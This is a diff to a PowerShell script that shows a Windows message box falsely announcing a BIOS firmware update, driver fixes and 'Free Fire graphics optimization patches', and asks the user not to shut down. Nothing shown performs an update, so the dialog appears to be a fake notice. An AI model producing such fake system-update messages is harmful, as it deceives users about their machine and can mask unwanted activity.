@@ -1,6 +1,6 @@
 Add-Type -AssemblyName System.Windows.Forms
 [System.Windows.Forms.MessageBox]::Show(
-    "A critical BIOS update is currently being installed on your system. Please do not turn off or restart your computer manually. The system will automatically restart and continue the update shortly. Several background updates and bug fixes are actively being applied. Please wait patiently until the process is complete. Your data is safe.",
+    "Your system is currently applying a BIOS firmware update along with Free Fire graphics optimization patches.`n`nMultiple background driver updates and system bug fixes are being installed automatically.`n`nThe process will take a few more minutes. Your PC will restart on its own once everything is done.`n`nFeel free to continue using other apps, but please do not force shut down or press the power button while the update is in progress.",
     "System Update in Progress",
     "OK",
     "Information"
